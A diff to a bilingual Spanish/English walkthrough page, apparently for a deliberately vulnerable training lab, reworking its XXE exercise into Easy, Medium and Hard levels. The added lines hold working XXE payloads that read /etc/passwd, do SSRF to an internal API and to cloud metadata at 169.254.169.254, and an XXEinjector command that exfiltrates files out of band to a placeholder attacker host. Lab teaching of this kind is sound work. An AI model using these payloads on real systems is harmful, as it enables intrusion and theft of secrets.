@@ -106,18 +106,9 @@
       <li>Rellena el formulario de tickets con cualquier dato y pulsa <strong>"Enviar Ticket"</strong>.</li>
       <li>En Burp → <strong>Proxy → HTTP history</strong>, localiza la petición <code>POST /xxe/api</code>.</li>
       <li>Haz clic derecho → <strong>Send to Repeater</strong>.</li>
-      <li>En el <strong>Repeater</strong>, verás el body XML original:</li>
+      <li><strong>Easy:</strong> Sin filtro. Inyecta directamente una entidad XXE:</li>
     </ol>
-    <pre>&lt;ticket&gt;
-  &lt;name&gt;Juan Pérez&lt;/name&gt;
-  &lt;email&gt;juan@empresa.com&lt;/email&gt;
-  &lt;subject&gt;Soporte Técnico&lt;/subject&gt;
-  &lt;message&gt;Mi problema...&lt;/message&gt;
-&lt;/ticket&gt;</pre>
-    <ol start="6">
-      <li>Modifica el body para inyectar una entidad externa XXE:</li>
-    </ol>
-    <h4>Leer /etc/passwd</h4>
+    <h4>Leer /etc/passwd (Easy)</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -153,9 +144,28 @@
   &lt;message&gt;test&lt;/message&gt;
 &lt;/ticket&gt;</pre>
 
-    <ol start="7">
-      <li>Pulsa <strong>Send</strong> en el Repeater. El contenido del archivo aparece en el campo <code>name</code> de la respuesta JSON.</li>
-      <li>Prueba con diferentes archivos: <code>/etc/hostname</code>, <code>/app/secret/flag.txt</code>, <code>/proc/self/environ</code></li>
+    <ol start="6">
+      <li><strong>Medium:</strong> Bloquea el protocolo <code>file://</code>. Bypass con SSRF usando <code>http://</code>:
+        <pre># Lee la API interna de usuarios
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:5000/api/users"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+  &lt;subject&gt;x&lt;/subject&gt;
+  &lt;message&gt;x&lt;/message&gt;
+&lt;/ticket&gt;
+
+# SSRF a metadatos cloud
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
+        El filtro bloquea <code>file://</code> pero no <code>http://</code> — permite SSRF a servicios internos.</li>
+      <li><strong>Hard:</strong> Bloquea <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. XXE directo está bloqueado. Usa técnicas avanzadas:
+        <pre># XXEinjector para Out-of-Band (OOB) extraction
+ruby XXEinjector.rb --host=TU_IP --httpport=8080 \
+  --file=/etc/passwd --oob=http \
+  --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
     </ol>
 
     <h3>¿Por qué funciona?</h3>
@@ -190,18 +200,9 @@
       <li>Fill in the ticket form with any data and click <strong>"Enviar Ticket"</strong>.</li>
       <li>In Burp → <strong>Proxy → HTTP history</strong>, find the <code>POST /xxe/api</code> request.</li>
       <li>Right-click → <strong>Send to Repeater</strong>.</li>
-      <li>In the <strong>Repeater</strong>, you'll see the original XML body:</li>
+      <li><strong>Easy:</strong> No filter. Inject an XXE entity directly:</li>
     </ol>
-    <pre>&lt;ticket&gt;
-  &lt;name&gt;Juan Pérez&lt;/name&gt;
-  &lt;email&gt;juan@empresa.com&lt;/email&gt;
-  &lt;subject&gt;Soporte Técnico&lt;/subject&gt;
-  &lt;message&gt;My problem...&lt;/message&gt;
-&lt;/ticket&gt;</pre>
-    <ol start="6">
-      <li>Modify the body to inject an XXE external entity:</li>
-    </ol>
-    <h4>Read /etc/passwd</h4>
+    <h4>Read /etc/passwd (Easy)</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -238,8 +239,27 @@
 &lt;/ticket&gt;</pre>
 
     <ol start="7">
-      <li>Click <strong>Send</strong> in the Repeater. The file contents appear in the <code>name</code> field of the JSON response.</li>
-      <li>Try different files: <code>/etc/hostname</code>, <code>/app/secret/flag.txt</code>, <code>/proc/self/environ</code></li>
+      <li><strong>Medium:</strong> Blocks <code>file://</code> protocol. Bypass with SSRF using <code>http://</code>:
+        <pre># Read internal API
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:5000/api/users"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+  &lt;subject&gt;x&lt;/subject&gt;
+  &lt;message&gt;x&lt;/message&gt;
+&lt;/ticket&gt;
+
+# SSRF to cloud metadata
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
+        Filter blocks <code>file://</code> but not <code>http://</code> — allows SSRF to internal services.</li>
+      <li><strong>Hard:</strong> Blocks <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. Direct XXE is blocked. Use advanced techniques:
+        <pre># XXEinjector for Out-of-Band (OOB) extraction
+ruby XXEinjector.rb --host=YOUR_IP --httpport=8080 \
+  --file=/etc/passwd --oob=http \
+  --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
     </ol>
 
     <h3>Why does it work?</h3>
